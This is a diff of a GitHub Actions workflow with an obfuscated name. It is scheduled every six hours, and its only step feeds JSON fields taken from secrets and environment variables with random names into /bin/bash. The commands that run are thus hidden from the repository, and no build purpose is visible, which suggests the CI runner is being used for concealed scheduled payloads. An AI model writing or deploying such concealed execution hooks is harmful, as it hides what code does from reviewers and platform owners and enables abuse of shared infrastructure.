@@ -3,24 +3,21 @@ name: yuanbanlao1839
 on:
   workflow_dispatch:
   schedule:
-    - cron: '45 4/6 * * *'
+    - cron: '1 0/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: yuanbanlao1839
         env:
-          x2: ${{ secrets.x2 }}
+          rb98: ${{ secrets.rb98 }}
         run: |
-          echo $x2 | jq -r .lhvuh87917 | /bin/bash
-          echo $xjoer25964 | jq -r .l99 | /bin/bash
-          echo $dtquj2475 | jq -r .q30194 | /bin/bash
-          echo $rvbk30 | jq -r .fz02624 | /bin/bash
-          echo $skuhn19 | jq -r .clrl788 | /bin/bash
-          echo $pm1562 | jq -r .s79581 | /bin/bash
-          echo $rluhj126 | jq -r .yv5817 | /bin/bash
-          echo $zl8 | jq -r .pihb3 | /bin/bash
+          echo $rb98 | jq -r .l8 | /bin/bash
+          echo $wec8172 | jq -r .flt950 | /bin/bash
+          echo $kuopp9182 | jq -r .lclij1 | /bin/bash
+          echo $zmxom25430 | jq -r .nuy7 | /bin/bash
+          echo $o52 | jq -r .tpmng9912 | /bin/bash
+          echo $fxncx78582 | jq -r .kni3 | /bin/bash
 
